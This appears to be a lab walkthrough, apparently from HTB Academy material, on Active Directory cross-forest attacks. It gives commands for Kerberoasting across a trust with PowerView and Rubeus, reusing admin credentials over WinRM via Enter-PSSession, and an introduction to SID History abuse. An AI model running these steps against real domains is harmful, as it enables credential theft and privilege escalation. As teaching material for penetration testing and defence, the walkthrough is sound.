## Cross-Forest Kerberoasting

Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction.

Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.

#### Enumerating Accounts for Associated SPNs Using Get-DomainUser

	PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

	samaccountname
	--------------
	krbtgt
	mssqlsvc

#### Enumerating the mssqlsvc Account

	PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

Let's perform a Kerberoasting attack across the trust using `Rubeus`.

#### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

	PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

We could then run the hash through Hashcat.

---
## Admin Password Re-Use & Group Membership

If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account (or an account that is part of the Enterprise Admins or Domain Admins group in Domain A), and Domain B has a highly privileged account with the same name, then it is worth checking for password reuse across the two forests.

We can use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`.

#### Using Get-DomainForeignGroupMember

	PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

	PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

`FREIGHTLOGISTICS.LOCAL` has the built-in Administrator account for the `INLANEFREIGHT.LOCAL` domain as a member. We can verify this access using the `Enter-PSSession` cmdlet to connect over WinRM.

#### Accessing DC03 Using Enter-PSSession

	PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator


---

## SID History Abuse - Cross Forest

SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.


